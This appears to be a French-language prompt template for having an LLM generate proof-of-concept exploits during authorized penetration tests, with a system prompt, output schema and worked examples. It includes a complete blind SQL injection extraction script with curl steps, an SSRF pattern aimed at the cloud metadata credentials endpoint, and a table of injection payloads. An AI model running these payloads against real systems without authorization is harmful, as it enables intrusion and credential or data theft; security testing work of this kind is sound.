# Exploit PoC Generator

## Quand utiliser ce prompt

Utiliser ce prompt lorsque vous avez identifie une vulnerabilite confirmee et que vous devez produire un Proof of Concept fonctionnel pour demontrer l'impact reel. Ce prompt intervient apres la phase de decouverte et de validation, juste avant la redaction du rapport. Il couvre les vulnerabilites web (requetes HTTP), les vulnerabilites au niveau du code (scripts d'exploitation), et les vulnerabilites binaires (squelette d'exploit). Le PoC genere doit etre demonstratif sans etre destructif : lecture plutot qu'ecriture, `id` plutot que `rm`, extraction de preuve plutot que modification de donnees.

## Variables a remplir

| Variable | Description | Exemple |
|----------|-------------|---------|
| `{{VULN_TYPE}}` | Classe de vulnerabilite identifiee | `SQL Injection (blind boolean-based)` |
| `{{VULN_DESCRIPTION}}` | Description technique detaillee de la vulnerabilite | `Le parametre "id" dans /api/users est injecte directement dans une requete SQL sans sanitization` |
| `{{AFFECTED_COMPONENT}}` | Composant, endpoint, fonction ou binaire affecte | `/api/users?id=INJECT` |
| `{{TECH_STACK}}` | Technologies utilisees par la cible | `Python Flask, PostgreSQL 14, Nginx reverse proxy, Linux x86_64` |
| `{{TARGET}}` | URL ou adresse de la cible autorisee | `https://target.example.com` |
| `{{SCOPE}}` | Perimetre autorise de l'exploitation | `Lecture seule, pas d'exfiltration de donnees personnelles, environnement de staging uniquement` |
| `{{CONTEXT}}` | Contexte additionnel : authentification requise, headers, tokens | `Bearer token requis, cookie de session PHPSESSID` |
| `{{EVIDENCE}}` | Preuves existantes de la vulnerabilite (reponses, logs, captures) | `Reponse 200 avec delai de 5s lors de l'injection sleep(5)` |

---

## System Prompt

```
You are an elite offensive security engineer and exploit developer with 15+ years of experience in vulnerability research, penetration testing, and responsible disclosure. You specialize in creating clean, reliable, and safe Proof of Concept exploits that demonstrate real impact without causing damage to production systems.

Your core principles:
1. SAFETY FIRST: Every PoC must demonstrate impact through read operations, not write/delete operations. Use "id", "whoami", "cat /etc/hostname" instead of destructive commands. For data extraction, prove access with row counts or metadata, not actual sensitive data.
2. RELIABILITY: PoC code must work on first execution when pointed at a vulnerable target. Include error handling, timeout management, and clear success/failure indicators.
3. CLARITY: Code must be readable, well-commented, and structured so that a triager can understand and reproduce within 5 minutes.
4. COMPLETENESS: Include all prerequisites, dependencies, environment setup, and expected output.

You MUST follow these rules:
- NEVER generate destructive payloads (no file deletion, no data modification, no denial of service)
- NEVER hardcode credentials or real target data in examples
- ALWAYS include a disclaimer header in generated code
- ALWAYS provide both automated (script) and manual (curl/browser) reproduction steps
- If you are uncertain about a technique or its applicability, explicitly state your uncertainty level
- Do NOT hallucinate library functions, API behaviors, or protocol details. If you are unsure, say so.
- All CVSS scoring must follow CVSS v3.1 specification exactly
- Output MUST be valid JSON where JSON is requested
```

---

## User Prompt

```
<context>
I have identified a confirmed vulnerability during an authorized penetration test. I need a functional Proof of Concept that demonstrates real impact while remaining safe and non-destructive.

Target: {{TARGET}}
Scope constraints: {{SCOPE}}
Authentication context: {{CONTEXT}}
</context>

<target>
Vulnerability type: {{VULN_TYPE}}
Vulnerability description: {{VULN_DESCRIPTION}}
Affected component: {{AFFECTED_COMPONENT}}
Technology stack: {{TECH_STACK}}
Existing evidence: {{EVIDENCE}}
</target>

<instructions>
Generate a complete, functional Proof of Concept exploit following this exact methodology:

STEP 1 - THINKING BLOCK (mandatory):
<thinking>
- Analyze the vulnerability class and its standard exploitation techniques
- Identify the most reliable and safe exploitation vector
- Determine required dependencies and prerequisites
- Plan the PoC structure: setup, exploit, verification, cleanup
- Assess potential side effects and how to minimize them
- Consider edge cases: WAF, rate limiting, encoding requirements
- Select the appropriate PoC template from the vulnerability class
</thinking>

STEP 2 - Generate the PoC package containing:

a) EXPLOIT SCRIPT: Primary PoC in Python 3 (preferred) or Bash, with:
   - Shebang line and encoding declaration
   - Disclaimer/legal header
   - Argument parsing (target URL, credentials if needed, output options)
   - Core exploit logic with inline comments explaining each step
   - Response validation (how to distinguish success from failure)
   - Clean output showing the proof of exploitation
   - Error handling for common failure modes (timeout, WAF block, auth failure)
   - Exit codes (0 = success/vulnerable, 1 = not vulnerable, 2 = error)

b) MANUAL REPRODUCTION: Step-by-step curl commands or browser actions that reproduce the vulnerability without the script, for triager verification.

c) EXPECTED OUTPUT: Exact sample output showing what success looks like, what failure looks like.

d) PREREQUISITES: All dependencies, setup steps, authentication requirements.

e) CVSS v3.1 SCORING: Calculate the precise CVSS score with full vector string and justification for each metric.

f) SAFETY ANALYSIS: Explicit statement of what the PoC does and does NOT do. Confirm no destructive actions.
</instructions>

<output_format>
Return a JSON object with this exact structure:
{
  "poc_metadata": {
    "vulnerability_class": "string - CWE ID and name",
    "cvss_v3_1": {
      "score": "float",
      "severity": "string - Critical/High/Medium/Low/None",
      "vector": "string - full CVSS vector",
      "justification": {
        "AV": "string - reasoning",
        "AC": "string - reasoning",
        "PR": "string - reasoning",
        "UI": "string - reasoning",
        "S": "string - reasoning",
        "C": "string - reasoning",
        "I": "string - reasoning",
        "A": "string - reasoning"
      }
    },
    "affected_component": "string",
    "tech_stack": "string"
  },
  "prerequisites": {
    "dependencies": ["list of required packages/tools"],
    "setup_commands": ["list of shell commands to set up environment"],
    "authentication": "string - description of auth requirements",
    "network_requirements": "string - connectivity requirements"
  },
  "exploit_script": {
    "language": "string - python3 or bash",
    "filename": "string - suggested filename",
    "code": "string - complete exploit code with comments",
    "usage": "string - command line usage example"
  },
  "manual_reproduction": {
    "steps": [
      {
        "step_number": 1,
        "description": "string - what this step does",
        "command": "string - curl command or browser action",
        "expected_response": "string - what to look for in the response"
      }
    ]
  },
  "expected_output": {
    "vulnerable": "string - sample output when target is vulnerable",
    "not_vulnerable": "string - sample output when target is not vulnerable",
    "error": "string - sample output when an error occurs"
  },
  "safety_analysis": {
    "actions_performed": ["list of actions the PoC takes"],
    "actions_not_performed": ["list of destructive actions explicitly avoided"],
    "side_effects": "string - any potential side effects (e.g., log entries)",
    "cleanup_required": "string - any cleanup steps needed after execution"
  },
  "confidence_level": "string - High/Medium/Low with reasoning"
}
</output_format>

<constraints>
- All code must be syntactically valid and executable
- No destructive operations: no DELETE, no DROP, no rm, no file modification on target
- Use safe demonstration commands: id, whoami, cat /etc/hostname, SELECT version(), current_user()
- Include timeout handling (default 10 seconds per request)
- The PoC must work with standard penetration testing tools (requests, curl, python3)
- Do not assume any non-standard libraries unless explicitly listed in prerequisites
- If exploitation requires multiple steps, each step must validate the previous step succeeded before continuing
- For binary exploits, provide a skeleton/template that demonstrates the technique without a fully weaponized payload
- If you are uncertain about any aspect, flag it with [UNCERTAINTY] and explain what needs manual verification
</constraints>
```

---

## Prefill (assistant)

```
{
  "poc_metadata": {
```

---

## Few-shot Examples

### Example 1: Blind SQL Injection PoC

**Input variables:**
- `{{VULN_TYPE}}`: `SQL Injection (blind boolean-based)`
- `{{VULN_DESCRIPTION}}`: `The "id" parameter in GET /api/v2/users is concatenated into a SQL query without parameterization. Boolean conditions in the parameter alter the response: true conditions return 200 with user data, false conditions return 200 with empty array.`
- `{{AFFECTED_COMPONENT}}`: `GET /api/v2/users?id=1`
- `{{TECH_STACK}}`: `Node.js Express, MySQL 8.0, AWS ALB`
- `{{TARGET}}`: `https://app.target.example.com`
- `{{SCOPE}}`: `Read-only data extraction proof, no modification, staging environment`
- `{{CONTEXT}}`: `Requires Authorization: Bearer <JWT> header, obtained via /api/auth/login`
- `{{EVIDENCE}}`: `id=1 AND 1=1 returns user data; id=1 AND 1=2 returns empty array`

**Expected output (abbreviated):**

```json
{
  "poc_metadata": {
    "vulnerability_class": "CWE-89: Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)",
    "cvss_v3_1": {
      "score": 8.6,
      "severity": "High",
      "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N",
      "justification": {
        "AV": "Network - exploitable remotely via HTTP",
        "AC": "Low - no special conditions needed, injection point is straightforward",
        "PR": "Low - requires a valid authenticated session (JWT)",
        "UI": "None - no user interaction required",
        "S": "Changed - the vulnerable component is the web app but the impacted component is the database",
        "C": "High - can extract arbitrary data from the database including other users' data",
        "I": "None - PoC is read-only, but real-world impact could include writes",
        "A": "None - no availability impact demonstrated"
      }
    },
    "affected_component": "GET /api/v2/users?id=",
    "tech_stack": "Node.js Express, MySQL 8.0, AWS ALB"
  },
  "prerequisites": {
    "dependencies": ["python3", "requests"],
    "setup_commands": ["pip install requests"],
    "authentication": "Valid JWT token obtained via POST /api/auth/login with valid credentials",
    "network_requirements": "HTTPS access to app.target.example.com on port 443"
  },
  "exploit_script": {
    "language": "python3",
    "filename": "poc_sqli_blind_boolean.py",
    "code": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nPoC: Blind Boolean-based SQL Injection in /api/v2/users\nTarget: app.target.example.com\nAuthor: [Pentester Name]\nDate: [Date]\n\nDISCLAIMER: This script is provided for authorized security testing only.\nUnauthorized access to computer systems is illegal. Use responsibly.\n\nThis PoC demonstrates read-only data extraction (database version)\nwithout modifying any data on the target system.\n\"\"\"\n\nimport requests\nimport sys\nimport argparse\nimport string\nimport time\n\ndef get_args():\n    parser = argparse.ArgumentParser(description='Blind SQLi PoC - Boolean-based')\n    parser.add_argument('-t', '--target', required=True, help='Target base URL')\n    parser.add_argument('-k', '--token', required=True, help='JWT Bearer token')\n    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds')\n    parser.add_argument('--delay', type=float, default=0.5, help='Delay between requests')\n    return parser.parse_args()\n\ndef check_condition(target, token, condition, timeout):\n    \"\"\"Inject a boolean condition and return True if the condition is true on the DB side.\"\"\"\n    url = f\"{target}/api/v2/users\"\n    # Payload: 1 AND (<condition>)\n    params = {'id': f'1 AND ({condition})'}\n    headers = {'Authorization': f'Bearer {token}'}\n    try:\n        resp = requests.get(url, params=params, headers=headers, timeout=timeout)\n        # True condition returns non-empty array, false returns empty array\n        data = resp.json()\n        return len(data) > 0\n    except requests.exceptions.Timeout:\n        print('[ERROR] Request timed out')\n        return None\n    except Exception as e:\n        print(f'[ERROR] {e}')\n        return None\n\ndef extract_string(target, token, query, max_len=64, timeout=10, delay=0.5):\n    \"\"\"Extract a string character by character using boolean conditions.\"\"\"\n    result = ''\n    charset = string.printable[:95]  # printable ASCII\n    for pos in range(1, max_len + 1):\n        found = False\n        for char in charset:\n            condition = f\"SUBSTRING(({query}),{pos},1)='{char}'\"\n            if check_condition(target, token, condition, timeout):\n                result += char\n                sys.stdout.write(f'\\r[*] Extracting: {result}')\n                sys.stdout.flush()\n                found = True\n                time.sleep(delay)\n                break\n            time.sleep(delay)\n        if not found:\n            break\n    print()  # newline after extraction\n    return result\n\ndef main():\n    args = get_args()\n    print('[*] PoC: Blind Boolean-based SQL Injection')\n    print(f'[*] Target: {args.target}')\n    print()\n\n    # Step 1: Verify injection works\n    print('[+] Step 1: Verifying injection point...')\n    true_test = check_condition(args.target, args.token, '1=1', args.timeout)\n    false_test = check_condition(args.target, args.token, '1=2', args.timeout)\n\n    if true_test is True and false_test is False:\n        print('[+] Injection confirmed: boolean conditions alter response')\n    else:\n        print('[-] Injection not confirmed. Target may not be vulnerable.')\n        sys.exit(1)\n\n    # Step 2: Extract database version (safe read-only operation)\n    print('[+] Step 2: Extracting database version...')\n    version = extract_string(args.target, args.token, 'SELECT VERSION()',\n                            timeout=args.timeout, delay=args.delay)\n    print(f'[+] Database version: {version}')\n\n    # Step 3: Extract current database user (safe read-only operation)\n    print('[+] Step 3: Extracting current database user...')\n    user = extract_string(args.target, args.token, 'SELECT CURRENT_USER()',\n                         timeout=args.timeout, delay=args.delay)\n    print(f'[+] Current DB user: {user}')\n\n    print()\n    print('[+] PoC completed successfully. Vulnerability confirmed.')\n    print('[!] Impact: Arbitrary read access to the MySQL database as the application user.')\n    sys.exit(0)\n\nif __name__ == '__main__':\n    main()\n",
    "usage": "python3 poc_sqli_blind_boolean.py -t https://app.target.example.com -k <JWT_TOKEN>"
  },
  "manual_reproduction": {
    "steps": [
      {
        "step_number": 1,
        "description": "Authenticate and obtain JWT token",
        "command": "curl -s -X POST https://app.target.example.com/api/auth/login -H 'Content-Type: application/json' -d '{\"username\":\"testuser\",\"password\":\"testpass\"}' | jq -r '.token'",
        "expected_response": "A JWT token string"
      },
      {
        "step_number": 2,
        "description": "Verify TRUE condition returns data",
        "command": "curl -s 'https://app.target.example.com/api/v2/users?id=1%20AND%201=1' -H 'Authorization: Bearer <TOKEN>' | jq length",
        "expected_response": "Returns 1 or more (non-empty array)"
      },
      {
        "step_number": 3,
        "description": "Verify FALSE condition returns empty",
        "command": "curl -s 'https://app.target.example.com/api/v2/users?id=1%20AND%201=2' -H 'Authorization: Bearer <TOKEN>' | jq length",
        "expected_response": "Returns 0 (empty array)"
      },
      {
        "step_number": 4,
        "description": "Extract first character of database version",
        "command": "curl -s 'https://app.target.example.com/api/v2/users?id=1%20AND%20SUBSTRING((SELECT%20VERSION()),1,1)=%278%27' -H 'Authorization: Bearer <TOKEN>' | jq length",
        "expected_response": "Returns 1+ if MySQL version starts with 8, 0 otherwise"
      }
    ]
  },
  "expected_output": {
    "vulnerable": "[*] PoC: Blind Boolean-based SQL Injection\n[*] Target: https://app.target.example.com\n\n[+] Step 1: Verifying injection point...\n[+] Injection confirmed: boolean conditions alter response\n[+] Step 2: Extracting database version...\n[*] Extracting: 8.0.32\n[+] Database version: 8.0.32\n[+] Step 3: Extracting current database user...\n[*] Extracting: app_user@localhost\n[+] Current DB user: app_user@localhost\n\n[+] PoC completed successfully. Vulnerability confirmed.\n[!] Impact: Arbitrary read access to the MySQL database as the application user.",
    "not_vulnerable": "[*] PoC: Blind Boolean-based SQL Injection\n[*] Target: https://app.target.example.com\n\n[+] Step 1: Verifying injection point...\n[-] Injection not confirmed. Target may not be vulnerable.",
    "error": "[*] PoC: Blind Boolean-based SQL Injection\n[*] Target: https://app.target.example.com\n\n[+] Step 1: Verifying injection point...\n[ERROR] Request timed out"
  },
  "safety_analysis": {
    "actions_performed": [
      "HTTP GET requests with SQL injection payloads in query parameters",
      "Read-only SQL operations: SELECT VERSION(), SELECT CURRENT_USER()",
      "Boolean condition testing via response analysis"
    ],
    "actions_not_performed": [
      "No INSERT, UPDATE, DELETE, or DROP statements",
      "No file system operations on the target",
      "No data exfiltration of personal or sensitive user data",
      "No modification of application state or database records"
    ],
    "side_effects": "Each request generates a log entry on the target web server and ALB. The injection payloads will appear in access logs.",
    "cleanup_required": "No cleanup required. All operations are read-only GET requests."
  },
  "confidence_level": "High - Boolean-based blind SQLi is a well-understood technique, and the evidence (differential response to 1=1 vs 1=2) strongly confirms the vulnerability."
}
```

---

### Example 2: SSRF PoC (abbreviated pattern)

**Input variables:**
- `{{VULN_TYPE}}`: `Server-Side Request Forgery (SSRF)`
- `{{AFFECTED_COMPONENT}}`: `POST /api/webhook/test with "url" parameter`
- `{{TECH_STACK}}`: `Java Spring Boot, AWS EC2`

**Expected output pattern (key sections):**

```json
{
  "poc_metadata": {
    "vulnerability_class": "CWE-918: Server-Side Request Forgery (SSRF)",
    "cvss_v3_1": {
      "score": 9.1,
      "severity": "Critical",
      "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N"
    }
  },
  "exploit_script": {
    "language": "python3",
    "filename": "poc_ssrf_metadata.py",
    "code": "... script that sends POST with url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ ..."
  },
  "safety_analysis": {
    "actions_performed": ["Read-only access to EC2 instance metadata"],
    "actions_not_performed": ["No lateral movement", "No credential usage", "No internal network scanning"]
  }
}
```

---

### PoC Template Reference (for thinking block)

| Vuln Class | Safe Demonstration | Template Pattern |
|---|---|---|
| SQL Injection | Extract DB version, current user | Boolean/time-based extraction loop |
| XSS (Reflected/Stored) | `alert(document.domain)` | HTTP request + response showing reflection |
| SSRF | Read metadata endpoint | POST/GET with internal URL |
| Command Injection | `id`, `whoami`, `cat /etc/hostname` | Request with injected command |
| Path Traversal | Read `/etc/hostname` or known safe file | Request with `../` sequences |
| IDOR | Access another test account's data | Two authenticated requests comparison |
| Deserialization | Execute `id` or DNS callback | Serialized object with safe command |
| SSTI | Evaluate `7*7=49` | Template expression injection |
| XXE | Read `/etc/hostname` via external entity | XML payload with DTD |
| File Upload | Upload `.html` with `alert(1)` | Multipart upload + access |
